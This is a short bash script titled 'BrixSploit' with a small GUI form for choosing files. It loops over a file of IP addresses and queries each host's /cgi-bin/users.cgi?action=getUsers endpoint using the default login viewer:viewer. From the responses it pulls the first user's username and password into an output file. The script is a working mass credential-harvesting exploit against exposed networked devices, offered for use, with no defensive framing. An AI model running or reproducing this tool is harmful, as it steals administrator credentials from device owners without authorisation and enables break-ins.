#! /bin/bash
text="BrixSploit by EMLGaming, M00SE &amp; Scrumplex"
eval $(yad --name=BrixSploit --window-icon="logo.png" --title=BrixSploit --text="$text" \
--width=400 --form --field=Inputfile:SFL --field=Outputfile:SFL \
"" "" | awk -F'|' '{printf "INPUT=\"%s\"\nOUTPUT=\"%s\"\n", $1, $2}')
[[ -z $INPUT || -z $OUTPUT ]] && exit 1
let x=0
lines="$(wc -l $INPUT | tr -dc '[:alnum:]\n\r' | sed 's/[^0-9]*//g')"
while IFS='' read -r ip || [[ -n "$ip" ]]; do
    let x+=1
    echo "Working on IP $ip ($x/$lines)"
    printf $ip"\n" >> $OUTPUT 2>&1
    curl -s --max-time 3 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer | grep -E '(User1.username|User1.password)' | grep \
    -o -E '(userna.*|passwo.*)' >> $OUTPUT 2>&1
    printf "\n" >> $OUTPUT 2>&1
    done < "$INPUT"
printf "\nDONE! Saved to $OUTPUT!\n"
